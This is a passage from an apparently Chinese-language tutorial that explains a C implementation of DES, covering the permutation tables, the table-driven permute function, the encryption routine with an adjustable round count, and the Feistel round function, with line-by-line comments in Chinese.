punctuation">;</span>    <span class="token comment">/* reverse 32-bit permutation in f */</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中perminit()用于置换初始化</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">/* initialize a perm array, p: 64-bit, either init or final */</span><span class="token comment">//这里perm[16][16][8]数组的第三维的理解很重要，指的是k&gt;&gt;3即要输出的位置（单位为字节，即指要输出的是第几个字节的位置，总共64位，8字节），看permute置换函数也可以明白</span><span class="token keyword">void</span> <span class="token function">perminit</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> perm<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> p<span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">register</span> <span class="token keyword">int</span> l<span class="token punctuation">,</span> j<span class="token punctuation">,</span> k<span class="token punctuation">;</span>  <span class="token keyword">int</span> i<span class="token punctuation">,</span>m<span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">16</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>         <span class="token comment">/* each input nibble position */</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> j<span class="token operator">&lt;</span><span class="token number">16</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span>       <span class="token comment">/* all possible input nibbles */</span>      <span class="token keyword">for</span> <span class="token punctuation">(</span>k<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> k<span class="token operator">&lt;</span><span class="token number">8</span><span class="token punctuation">;</span> k<span class="token operator">++</span><span class="token punctuation">)</span>      <span class="token comment">/* each byte of the mask */</span>        perm<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>       <span class="token comment">/* clear permutation array */</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">16</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>         <span class="token comment">/* each input nibble position */</span><span class="token comment">//第一个循环迭代变量i表示输入的4位二进制数的位置（0-15）</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> <span class="token number">16</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span>   <span class="token comment">/* each possible input nibble */</span><span class="token comment">//第二个循环迭代变量j表示可能的输入4位二进制数的取值（0-15）</span>      <span class="token keyword">for</span> <span class="token punctuation">(</span>k <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> k <span class="token operator">&lt;</span> <span class="token number">64</span><span class="token punctuation">;</span> k<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment">/* each output bit position  */</span><span class="token comment">//第三个循环迭代变量k表示输出位的位置（0-63）//这里已位bit为单位进行循环，而数组第三维是byte为单位</span>        l <span class="token operator">=</span> p<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>          <span class="token comment">/* where does this bit come from*/</span> <span class="token comment">//确定当前输出位的来源位置</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>l <span class="token operator">&gt;&gt;</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">!=</span> i<span class="token punctuation">)</span>     <span class="token comment">/* does it come from input posn?*/</span><span class="token comment">//条件判断if ((l &gt;&gt; 2) != i)用于检查当前输出位的来源位置是否与当前的输入位置i匹配。</span>          <span class="token keyword">continue</span><span class="token punctuation">;</span>            <span class="token comment">/* if not, bit k is 0 */</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>j <span class="token operator">&amp;</span> nibblebit<span class="token punctuation">[</span>l <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>          <span class="token keyword">continue</span><span class="token punctuation">;</span>            <span class="token comment">/* any such bit in input? */</span> <span class="token comment">//即对应的位输入为0，不需要对输出进行操作</span>        m <span class="token operator">=</span> k <span class="token operator">&amp;</span> <span class="token number">0x7</span><span class="token punctuation">;</span>           <span class="token comment">/* which bit is this in the byte*/</span>        perm<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span>k<span class="token operator">&gt;&gt;</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">|=</span> bytebit<span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token punctuation">;</span>   <span class="token comment">//这里是对对应位输出1，巧妙应用bytebit</span>      <span class="token punctuation">}</span><span class="token comment">//注意这里被绕得比较混蛋时要清楚高位决定哪一个字节（更高一维的结构），低位决定在字节的哪一位，类比页表这里，k的低三位决定k在字节的哪一位（m = k &amp; 0x7), k的高三位（k&gt;&gt;3）决定k在8个字节（总共64位）中的哪一位</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">const</span> <span class="token keyword">unsigned</span> <span class="token keyword">char</span> I<span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span>   <span class="token comment">/* identical permutation P */</span><span class="token comment">//即恒等置换</span>   <span class="token number">1</span><span class="token punctuation">,</span>  <span class="token number">2</span><span class="token punctuation">,</span>  <span class="token number">3</span><span class="token punctuation">,</span>  <span class="token number">4</span><span class="token punctuation">,</span>  <span class="token number">5</span><span class="token punctuation">,</span>  <span class="token number">6</span><span class="token punctuation">,</span>  <span class="token number">7</span><span class="token punctuation">,</span>  <span class="token number">8</span><span class="token punctuation">,</span>   <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span>  <span class="token number">17</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">,</span> <span class="token number">19</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">,</span> <span class="token number">22</span><span class="token punctuation">,</span> <span class="token number">23</span><span class="token punctuation">,</span> <span class="token number">24</span><span class="token punctuation">,</span>  <span class="token number">25</span><span class="token punctuation">,</span> <span class="token number">26</span><span class="token punctuation">,</span> <span class="token number">27</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">,</span> <span class="token number">29</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">31</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span>  <span class="token number">33</span><span class="token punctuation">,</span> <span class="token number">34</span><span class="token punctuation">,</span> <span class="token number">35</span><span class="token punctuation">,</span> <span class="token number">36</span><span class="token punctuation">,</span> <span class="token number">37</span><span class="token punctuation">,</span> <span class="token number">38</span><span class="token punctuation">,</span> <span class="token number">39</span><span class="token punctuation">,</span> <span class="token number">40</span><span class="token punctuation">,</span>  <span class="token number">41</span><span class="token punctuation">,</span> <span class="token number">42</span><span class="token punctuation">,</span> <span class="token number">43</span><span class="token punctuation">,</span> <span class="token number">44</span><span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">,</span> <span class="token number">46</span><span class="token punctuation">,</span> <span class="token number">47</span><span class="token punctuation">,</span> <span class="token number">48</span><span class="token punctuation">,</span>  <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">,</span> <span class="token number">51</span><span class="token punctuation">,</span> <span class="token number">52</span><span class="token punctuation">,</span> <span class="token number">53</span><span class="token punctuation">,</span> <span class="token number">54</span><span class="token punctuation">,</span> <span class="token number">55</span><span class="token punctuation">,</span> <span class="token number">56</span><span class="token punctuation">,</span>  <span class="token number">57</span><span class="token punctuation">,</span> <span class="token number">58</span><span class="token punctuation">,</span> <span class="token number">59</span><span class="token punctuation">,</span> <span class="token number">60</span><span class="token punctuation">,</span> <span class="token number">61</span><span class="token punctuation">,</span> <span class="token number">62</span><span class="token punctuation">,</span> <span class="token number">63</span><span class="token punctuation">,</span> <span class="token number">64</span> <span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">const</span> <span class="token keyword">unsigned</span> <span class="token keyword">char</span> ip<span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span>  <span class="token comment">/* initial permutation P */</span>  <span class="token number">58</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">,</span> <span class="token number">42</span><span class="token punctuation">,</span> <span class="token number">34</span><span class="token punctuation">,</span> <span class="token number">26</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span>  <span class="token number">2</span><span class="token punctuation">,</span>  <span class="token number">60</span><span class="token punctuation">,</span> <span class="token number">52</span><span class="token punctuation">,</span> <span class="token number">44</span><span class="token punctuation">,</span> <span class="token number">36</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span>  <span class="token number">4</span><span class="token punctuation">,</span>  <span class="token number">62</span><span class="token punctuation">,</span> <span class="token number">54</span><span class="token punctuation">,</span> <span class="token number">46</span><span class="token punctuation">,</span> <span class="token number">38</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">22</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span>  <span class="token number">6</span><span class="token punctuation">,</span>  <span class="token number">64</span><span class="token punctuation">,</span> <span class="token number">56</span><span class="token punctuation">,</span> <span class="token number">48</span><span class="token punctuation">,</span> <span class="token number">40</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">24</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span>  <span class="token number">8</span><span class="token punctuation">,</span>  <span class="token number">57</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">41</span><span class="token punctuation">,</span> <span class="token number">33</span><span class="token punctuation">,</span> <span class="token number">25</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span>  <span class="token number">9</span><span class="token punctuation">,</span>  <span class="token number">1</span><span class="token punctuation">,</span>  <span class="token number">59</span><span class="token punctuation">,</span> <span class="token number">51</span><span class="token punctuation">,</span> <span class="token number">43</span><span class="token punctuation">,</span> <span class="token number">35</span><span class="token punctuation">,</span> <span class="token number">27</span><span class="token punctuation">,</span> <span class="token number">19</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span>  <span class="token number">3</span><span class="token punctuation">,</span>  <span class="token number">61</span><span class="token punctuation">,</span> <span class="token number">53</span><span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">,</span> <span class="token number">37</span><span class="token punctuation">,</span> <span class="token number">29</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span>  <span class="token number">5</span><span class="token punctuation">,</span>  <span class="token number">63</span><span class="token punctuation">,</span> <span class="token number">55</span><span class="token punctuation">,</span> <span class="token number">47</span><span class="token punctuation">,</span> <span class="token number">39</span><span class="token punctuation">,</span> <span class="token number">31</span><span class="token punctuation">,</span> <span class="token number">23</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span>  <span class="token number">7</span> <span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">const</span> <span class="token keyword">unsigned</span> <span class="token keyword">char</span> fp<span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span>  <span class="token comment">/* final permutation F */</span>  <span class="token number">40</span><span class="token punctuation">,</span>  <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">48</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">56</span><span class="token punctuation">,</span> <span class="token number">24</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span>  <span class="token number">39</span><span class="token punctuation">,</span>  <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">47</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">55</span><span class="token punctuation">,</span> <span class="token number">23</span><span class="token punctuation">,</span> <span class="token number">63</span><span class="token punctuation">,</span> <span class="token number">31</span><span class="token punctuation">,</span>  <span class="token number">38</span><span class="token punctuation">,</span>  <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">46</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">54</span><span class="token punctuation">,</span> <span class="token number">22</span><span class="token punctuation">,</span> <span class="token number">62</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span>  <span class="token number">37</span><span class="token punctuation">,</span>  <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">53</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">,</span> <span class="token number">61</span><span class="token punctuation">,</span> <span class="token number">29</span><span class="token punctuation">,</span>  <span class="token number">36</span><span class="token punctuation">,</span>  <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">44</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">52</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">60</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">,</span>  <span class="token number">35</span><span class="token punctuation">,</span>  <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">43</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">51</span><span class="token punctuation">,</span> <span class="token number">19</span><span class="token punctuation">,</span> <span class="token number">59</span><span class="token punctuation">,</span> <span class="token number">27</span><span class="token punctuation">,</span>  <span class="token number">34</span><span class="token punctuation">,</span>  <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">42</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">,</span> <span class="token number">58</span><span class="token punctuation">,</span> <span class="token number">26</span><span class="token punctuation">,</span>  <span class="token number">33</span><span class="token punctuation">,</span>  <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">41</span><span class="token punctuation">,</span>  <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span> <span class="token number">57</span><span class="token punctuation">,</span> <span class="token number">25</span> <span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>置换函数</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">/* permute inblock with perm, result into outblock,64 bits */</span><span class="token keyword">void</span> <span class="token function">permute</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span>inblock<span class="token punctuation">,</span>             <span class="token keyword">unsigned</span> <span class="token keyword">char</span> perm<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token comment">/* 2K bytes defining perm.  */</span>             <span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span>outblock<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">register</span> <span class="token keyword">int</span> i<span class="token punctuation">,</span>j<span class="token punctuation">;</span>  <span class="token keyword">register</span> <span class="token keyword">char</span> <span class="token operator">*</span>ib<span class="token punctuation">,</span> <span class="token operator">*</span>ob<span class="token punctuation">,</span> <span class="token operator">*</span>p<span class="token punctuation">,</span> <span class="token operator">*</span>q<span class="token punctuation">;</span>  <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> ob<span class="token operator">=</span>outblock<span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">8</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token operator">*</span>ob<span class="token operator">++</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>   <span class="token comment">/* clear output block    */</span> <span class="token comment">//这个循环用于将输出数据块的每个字节都初始化为0，即清空输出块。</span>  ib <span class="token operator">=</span> inblock<span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span>j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> <span class="token number">16</span><span class="token punctuation">;</span> j <span class="token operator">+=</span> <span class="token number">2</span><span class="token punctuation">,</span> ib<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment">/* for each input nibble  */</span><span class="token comment">//8次循环，每次循环两个输入半字节</span>    ob <span class="token operator">=</span> outblock<span class="token punctuation">;</span>    p <span class="token operator">=</span> perm<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token operator">*</span>ib <span class="token operator">&gt;&gt;</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xf</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    q <span class="token operator">=</span> perm<span class="token punctuation">[</span>j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token operator">*</span>ib <span class="token operator">&amp;</span> <span class="token number">0xf</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">8</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token comment">/* and each output byte  */</span>      <span class="token operator">*</span>ob<span class="token operator">++</span> <span class="token operator">|=</span> <span class="token operator">*</span>p<span class="token operator">++</span> <span class="token operator">|</span> <span class="token operator">*</span>q<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token comment">/* OR the masks together*/</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>加密函数</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">/* encrypt 64-bit inblock  */</span><span class="token keyword">void</span> <span class="token function">endes</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span>inblock<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span>outblock<span class="token punctuation">,</span>           <span class="token keyword">int</span> round<span class="token punctuation">,</span> <span class="token keyword">int</span> have_ip<span class="token punctuation">,</span> <span class="token keyword">int</span> last_swap<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">char</span> iters<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span>       <span class="token comment">/* workspace for each iteration */</span><span class="token comment">//每次迭代</span>  <span class="token keyword">char</span> swap<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token comment">/* place to interchange L and R */</span>  <span class="token keyword">register</span> <span class="token keyword">int</span> i<span class="token punctuation">;</span>          <span class="token comment">//用于循环计数</span>  <span class="token keyword">register</span> <span class="token keyword">char</span> <span class="token operator">*</span>s<span class="token punctuation">;</span>        <span class="token comment">//指向交换数组swap的指针</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>have_ip <span class="token operator">==</span> HAVE_IP<span class="token punctuation">)</span>    <span class="token function">permute</span><span class="token punctuation">(</span>inblock<span class="token punctuation">,</span>iperm<span class="token punctuation">,</span>iters<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">/* apply initial permutation */</span><span class="token comment">//初始置换</span>  <span class="token keyword">else</span>    <span class="token function">permute</span><span class="token punctuation">(</span>inblock<span class="token punctuation">,</span>Iperm<span class="token punctuation">,</span>iters<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">/* don't apply initial permutation */</span><span class="token comment">//不执行初始置换，即等价置换</span>  <span class="token comment">/* don't re-copy to save space  */</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>round<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>      <span class="token comment">/* 16 churning operations  */</span>    <span class="token function">iter</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>iters<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span>iters<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  s <span class="token operator">=</span> swap<span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>last_swap <span class="token operator">==</span> LAST_SWAP<span class="token punctuation">)</span> <span class="token punctuation">{</span>              <span class="token comment">/* do last swap left and right */</span>    <span class="token comment">/* interchange left and right. */</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">8</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token operator">*</span>s<span class="token operator">++</span> <span class="token operator">=</span> iters<span class="token punctuation">[</span>round<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">4</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token operator">*</span>s<span class="token operator">++</span> <span class="token operator">=</span> iters<span class="token punctuation">[</span>round<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                     <span class="token comment">/* don't do last swap left and right */</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">8</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token operator">*</span>s<span class="token operator">++</span> <span class="token operator">=</span> iters<span class="token punctuation">[</span>round<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>have_ip <span class="token operator">==</span> HAVE_IP<span class="token punctuation">)</span>    <span class="token function">permute</span><span class="token punctuation">(</span>swap<span class="token punctuation">,</span>fperm<span class="token punctuation">,</span>outblock<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">/* apply final permutation  */</span>  <span class="token keyword">else</span>    <span class="token function">permute</span><span class="token punctuation">(</span>swap<span class="token punctuation">,</span>Iperm<span class="token punctuation">,</span>outblock<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">/* don't apply final permutation  */</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中的迭代函数</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">/* 1 churning operation, num: i.e. the num-th one */</span><span class="token keyword">void</span> <span class="token function">iter</span><span class="token punctuation">(</span><span class="token keyword">int</span> num<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">char</span> inblock<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">char</span> outblock<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>  <span class="token keyword">char</span> fret<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token comment">/* return from f(R[i-1],key)  */</span>  <span class="token keyword">register</span> <span class="token keyword">char</span> <span class="token operator">*</span>ib<span class="token punctuation">,</span> <span class="token operator">*</span>ob<span class="token punctuation">,</span> <span class="token operator">*</span>fb<span class="token punctuation">;</span>  ob <span class="token operator">=</span> outblock<span class="token punctuation">;</span> ib <span class="token operator">=</span> <span class="token operator">&amp;</span>inblock<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token function">f</span><span class="token punctuation">(</span>ib<span class="token punctuation">,</span> num<span class="token punctuation">,</span> fret<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">/* the primary transformation   */</span>  <span class="token operator">*</span>ob<span class="token operator">++</span> <span class="token operator">=</span> <span class="token operator">*</span>ib<span class="token operator">++</span><span class="token punctuation">;</span>       <span class="token comment">/* L[i] = R[i-1]    */</span>  <span class="token operator">*</span>ob<span class="token operator">++</span> <span class="token operator">=</span> <span class="token operator">*</span>ib<span class="token operator">++</span><span class="token punctuation">;</span>  <span class="token operator">*</span>ob<span class="token operator">++</span> <span class="token operator">=</span> <span class="token operator">*</span>ib<span class="token operator">++</span><span class="token punctuation">;</span>  <span class="token operator">*</span>ob<span class="token operator">++</span> <span class="token operator">=</span> <span class="token operator">*</span>ib<span class="token operator">++</span><span class="token punctuation">;</span>  ib <span class="token operator">=</span> inblock<span class="token punctuation">;</span> fb <span class="token operator">=</span> fret<span class="token punctuation">;</span>  <span class="token comment">/* R[i]=L[i] XOR f(R[i-1],key)  */</span>  <span class="token operator">*</span>ob<span class="token operator">++</span> <span class="token operator">=</span> <span class="token operator">*</span>ib<span class="token operator">++</span> <span class="token operator">^</span> <span class="token operator">*</span>fb<span class="token operator">++</span><span class="token punctuation">;</span>  <span class="token operator">*</span>ob<span class="token operator">++</span> <span class="token operator">=</span> <span class="token operator">*</span>ib<span class="token operator">++</span> <span class="token operator">^</span> <span class="token operator">*</span>fb<span class="token operator">++</span><span class="token punctuation">;</span>  <span class="token operator">*</span>ob<span class="token operator">++</span> <span class="token operator">=</span> <span class="token operator">*</span>ib<span class="token operator">++</span> <span class="token operator">^</span> <span class="token operator">*</span>fb<span class="token operator">++</span><span class="token punctuation">;</span>  <span class="token operator">*</span>ob<span class="token operator">++</span> <span class="token operator">=</span> <span class="token operator">*</span>ib<span class="token operator">++</span> <span class="token operator">^</span> <span class="token operator">*</span>fb<span class="token operator">++</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>迭代函数中的f函数</p><p><img 